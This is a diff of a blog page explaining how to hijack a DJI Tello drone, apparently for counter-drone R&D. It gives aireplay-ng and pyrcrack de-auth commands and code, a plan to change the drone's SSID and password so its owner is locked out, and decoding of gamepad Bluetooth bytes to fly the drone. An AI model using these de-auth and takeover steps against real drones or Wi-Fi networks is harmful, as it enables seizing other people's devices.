@@ -1,51 +1,36 @@
-<script setup lang="ts">
-import "@/assets/blog.css";
-</script>
+<script setup lang="ts"></script>
 <template>
   <title>Blog Tello Hack</title>
   <div class="container">
     <div class="content">
       <h1 id="a-way-to-hack-dji-tello">A way to hack Dji Tello</h1>
       <p>
-        I got an R&amp;D job few weeks ago that required me to hack multiple
-        drones, also known as <em>Counter-Unmanned Aircraft Swarm System</em>.
-        I'm in charge of confrontation and simulation work, but this is my first
-        foray into the field, so first and foremost, I need to understand how to
-        hack a single simple drone.
+        I got an R&amp;D job few weeks ago that required me to hack multiple drones, also known as
+        <em>Counter-Unmanned Aircraft Swarm System</em>. I'm in charge of confrontation and simulation work, but this is
+        my first foray into the field, so first and foremost, I need to understand how to hack a single simple drone.
       </p>
       <h2 id="system-design">System design</h2>
       <p>
-        Using a <strong>DJI Tello</strong> drone play victim role, a
-        <strong>Rock Pi</strong> as attacker program carrier, and a
-        <strong>GameSir T1d</strong> as attacker controller.
+        Using a <strong>DJI Tello</strong> drone play victim role, a <strong>Rock Pi</strong> as attacker program
+        carrier, and a <strong>GameSir T1d</strong> as attacker controller.
       </p>
       <p>
         <img src="/images/blogs/IMG20220929185104.jpg" />
       </p>
-      <p>
-        Two Wi-Fi cards are also required, one of which must be in monitor mode.
-      </p>
+      <p>Two Wi-Fi cards are also required, one of which must be in monitor mode.</p>
       <blockquote>
         <p>
-          I chose the RK3399 chip as the card, but the RockPi pre-built Ubuntu
-          Focal <strong>didn't enable</strong> this driver by default; choose a
-          right device make your life easier.
+          I chose the RK3399 chip as the card, but the RockPi pre-built Ubuntu Focal <strong>didn't enable</strong> this
+          driver by default; choose a right device make your life easier.
         </p>
       </blockquote>
+      <p>This system use front-end and back-end separated web service architecture, based on Ubuntu Server OS.</p>
       <p>
-        This system use front-end and back-end separated web service
-        architecture, based on Ubuntu Server OS.
-      </p>
-      <p>
-        Use <code>kismet</code> to monitor devices information,
-        <code>aircrack-ng</code> handle de-auth attack,
-        <code>NetworkManager</code> and <code>python-socket</code> controls
-        connection.
+        Use <code>kismet</code> to monitor devices information, <code>aircrack-ng</code> handle de-auth attack,
+        <code>NetworkManager</code> and <code>python-socket</code> controls connection.
       </p>
       <h3 id="take-a-try-first">Take a try first</h3>
-      <pre
-        class="hljs"
-      ><code><div>sudo airmon-ng start &lt;wlan_card&gt; # Enable monitor.
+      <pre class="hljs"><code><div>sudo airmon-ng start &lt;wlan_card&gt; # Enable monitor.
 <span class="hljs-meta">
 #</span><span class="bash"> Browser `localhost:2501` to use kismet web UI,</span>
 <span class="hljs-meta">#</span><span class="bash"> you can find drone`s MAC address easily.</span>
@@ -55,37 +40,27 @@ kismet -c &lt;wlan_card_mon&gt;
 sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
 </div></code></pre>
       <p>
-        During a de-auth attack, the connection becomes extremely unstable, even
-        disconnecting. It's work, huh, but you'll notice your phone is still
-        trying to reconnect, sometimes successfully.
+        During a de-auth attack, the connection becomes extremely unstable, even disconnecting. It's work, huh, but
+        you'll notice your phone is still trying to reconnect, sometimes successfully.
       </p>
-      <p>
-        This is a sign to the hacker: the owner can get his drone back, and you
-        don't want this happen.
-      </p>
+      <p>This is a sign to the hacker: the owner can get his drone back, and you don't want this happen.</p>
       <p>We need to clean what we exact need.</p>
       <h3 id="sort-out-the-needs">Sort out the needs</h3>
       <p>In theory, the hacking flow should be like this:</p>
       <ol>
         <li>de-auth attack to break connection from owner and drone.</li>
         <li>Hacker try connect drone during attack.</li>
-        <li>
-          Once connected, change drone's SSID to avoid owner connect back, also
-          a password is necessary.
-        </li>
+        <li>Once connected, change drone's SSID to avoid owner connect back, also a password is necessary.</li>
         <li>Hacker can use a controller to control drone.</li>
       </ol>
       <h2 id="development">Development</h2>
       <h3 id="monitor">Monitor</h3>
       <p>
-        Locate to <strong>kismet</strong> web ui &gt; setting &gt; api &gt; api
-        token, create a token that you can use kismet as a web server, there is
-        a API allow you have devices data with closable fields:
+        Locate to <strong>kismet</strong> web ui &gt; setting &gt; api &gt; api token, create a token that you can use
+        kismet as a web server, there is a API allow you have devices data with closable fields:
         <code>/devices/views/phydot11_accesspoints/devices.json</code>
       </p>
-      <pre
-        class="hljs"
-      ><code><div><span class="hljs-comment">// TypeScript</span>
+      <pre class="hljs"><code><div><span class="hljs-comment">// TypeScript</span>
 <span class="hljs-keyword">declare</span> <span class="hljs-keyword">namespace</span> API {
     <span class="hljs-keyword">interface</span> Drone_Data {
         [x: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
@@ -114,10 +89,7 @@ sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
 }
 </div></code></pre>
       <h3 id="attacker">Attacker</h3>
-      <p>
-        <strong>pyrcrack</strong> have a simple command to achieve de-auth
-        attack:
-      </p>
+      <p><strong>pyrcrack</strong> have a simple command to achieve de-auth attack:</p>
       <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
 <span class="hljs-keyword">import</span> asyncio
 
@@ -133,33 +105,25 @@ sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
 <span class="hljs-comment"># asyncio.run(deauth('wlan_card_mon','kismet.device.base.macaddr','dot11.device/dot11.device.associate_ssid_map'))</span>
 </div></code></pre>
       <p>
-        Declare &quot;cliaddr&quot; which is the last connection device from
-        drone, let de-auth attack only effect between drone and its owner.
+        Declare &quot;cliaddr&quot; which is the last connection device from drone, let de-auth attack only effect
+        between drone and its owner.
       </p>
       <h3 id="controller">Controller</h3>
       <p>
-        Duo to the GameSir T1d cannot connect to the drone directly when hacked,
-        I decided to use <strong>TelloPy</strong> as controller middleware to
-        convert the T1d signal into a drone control command.
+        Duo to the GameSir T1d cannot connect to the drone directly when hacked, I decided to use
+        <strong>TelloPy</strong> as controller middleware to convert the T1d signal into a drone control command.
       </p>
       <p>
-        T1d uses Bluetooth protocol to transmit data; there are three Services,
-        with the third receiving an unchanged byte stream and the second
-        changing at random. The byte stream received by a Service whose UUID
-        begins with <code>00008651</code> changes on a regular basis.
+        T1d uses Bluetooth protocol to transmit data; there are three Services, with the third receiving an unchanged
+        byte stream and the second changing at random. The byte stream received by a Service whose UUID begins with
+        <code>00008651</code> changes on a regular basis.
       </p>
       <p>
         When T1d on idle, the value received by the first Service is always been
-        <code>C9-C6-86-A1-00-DB-B9-03-01-01-01-0B-01-E1-07-07-06-10-1E-56</code
-        >.
+        <code>C9-C6-86-A1-00-DB-B9-03-01-01-01-0B-01-E1-07-07-06-10-1E-56</code>.
       </p>
-      <p>
-        The first two Bytes are always <code>A1-C5</code> when there is action.
-      </p>
-      <p>
-        As a result, the first two bytes can be used to determine the state of
-        the remote control.
-      </p>
+      <p>The first two Bytes are always <code>A1-C5</code> when there is action.</p>
+      <p>As a result, the first two bytes can be used to determine the state of the remote control.</p>
       <blockquote>
         <p>
           Notice: Rock Pi is Big-Endian, you will need change the hex value
@@ -172,20 +136,17 @@ sudo aireplay -D -deauth 10 -a &lt;drone_macaddr&gt; &lt;another_wlan_card&gt;
       </p>
       <p>
         When you press the button, the byte will increase by 2 until
-        <code>0xFF</code>, then return to <code>0x00</code>. This is used to
-        keep track of how many times the button is pressed.
+        <code>0xFF</code>, then return to <code>0x00</code>. This is used to keep track of how many times the button is
+        pressed.
       </p>
       <p>
-        Bytes 10-13 represent the state of the pressed button, and each button
-        on the handle corresponds to one bit. In fact, as long as these bytes
-        are read out one by one, they can correspond to the keys.
+        Bytes 10-13 represent the state of the pressed button, and each button on the handle corresponds to one bit. In
+        fact, as long as these bytes are read out one by one, they can correspond to the keys.
       </p>
       <p>
-        For stickers, bytes 3-7 represent the joystick's state. It took some
-        time to figure out which joystick corresponded to which bytes at first.
-        Later, I discovered that it was actually quite simple to guess. A total
-        of 5 bytes, 2 joysticks in a total of 4 directions, resulting in 10bit
-        per direction.
+        For stickers, bytes 3-7 represent the joystick's state. It took some time to figure out which joystick
+        corresponded to which bytes at first. Later, I discovered that it was actually quite simple to guess. A total of
+        5 bytes, 2 joysticks in a total of 4 directions, resulting in 10bit per direction.
       </p>
       <p>In general, 10bit AD is also quite common.</p>
       <pre class="hljs"><code><div>11 bits (-1024 ~ +1023) x 4 axis = 44 bits
@@ -199,8 +160,8 @@ fast_mode takes 1 bit
      byte5   byte4   byte3   byte2   byte1   byte0
 </div></code></pre>
       <p>
-        So long as these bytes are read out and then rounded up every 10 bits
-        into an integer, the joystick can be read again.
+        So long as these bytes are read out and then rounded up every 10 bits into an integer, the joystick can be read
+        again.
       </p>
       <p>A example code for displaying the T1d signal value is as follows:</p>
       <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
@@ -270,9 +231,8 @@ switch = {
 }
 </div></code></pre>
       <p>
-        <strong>TelloPy</strong> gave a game controller stick mapper (function
-        <code>__send_stick_command</code>) to control drone, so I motif it to
-        adapt T1d:
+        <strong>TelloPy</strong> gave a game controller stick mapper (function <code>__send_stick_command</code>) to
+        control drone, so I motif it to adapt T1d:
       </p>
       <pre class="hljs"><code><div><span class="hljs-comment"># Python</span>
 <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_send_stick_command</span><span class="hljs-params">(drone, stick_values)</span>:</span>
@@ -402,30 +362,26 @@ global_data = <span class="hljs-literal">None</span>
 
 </div></code></pre>
       <p>
-        There are still some &quot;TODO:&quot; items to complete, such as the
-        rub connection and changing the SSID; I won't go into detail in this
-        blog, but here are some points:
+        There are still some &quot;TODO:&quot; items to complete, such as the rub connection and changing the SSID; I
+        won't go into detail in this blog, but here are some points:
       </p>
       <ul>
         <li>
           <p>
-            Ubuntu controls Wi-Fi via NetworkManager, I use d-bus to control
-            NetworkManager. Create a multithreaded process that sends connection
-            requests erratically during a de-auth attack.
+            Ubuntu controls Wi-Fi via NetworkManager, I use d-bus to control NetworkManager. Create a multithreaded
+            process that sends connection requests erratically during a de-auth attack.
           </p>
         </li>
         <li>
           <p>
-            The Tello SDK includes a Python example that demonstrates how to
-            send a text command:
-            <code>sock.sendto('wifi new ssid&gt; pwd&gt;', tello address)</code
-            >.
+            The Tello SDK includes a Python example that demonstrates how to send a text command:
+            <code>sock.sendto('wifi new ssid&gt; pwd&gt;', tello address)</code>.
           </p>
         </li>
         <li>
           <p>
-            The hole program has multiple job running in asynchronous, jobs need
-            response a statue to frontend, use a task queue such as
+            The hole program has multiple job running in asynchronous, jobs need response a statue to frontend, use a
+            task queue such as
             <code>flask-celery</code> will make schedule easier.
           </p>
         </li>
@@ -438,19 +394,13 @@ global_data = <span class="hljs-literal">None</span>
         >
       </p>
       <p>
-        <a href="https://github.com/Diallomm/hack_GamesirT1d"
-          >https://github.com/Diallomm/hack_GamesirT1d</a
-        >
+        <a href="https://github.com/Diallomm/hack_GamesirT1d">https://github.com/Diallomm/hack_GamesirT1d</a>
       </p>
       <p>
-        <a href="https://github.com/hanyazou/TelloPy"
-          >https://github.com/hanyazou/TelloPy</a
-        >
+        <a href="https://github.com/hanyazou/TelloPy">https://github.com/hanyazou/TelloPy</a>
       </p>
       <p>
-        <a href="https://github.com/Matthias84/awesome-tello"
-          >https://github.com/Matthias84/awesome-tello</a
-        >
+        <a href="https://github.com/Matthias84/awesome-tello">https://github.com/Matthias84/awesome-tello</a>
       </p>
     </div>
   </div>
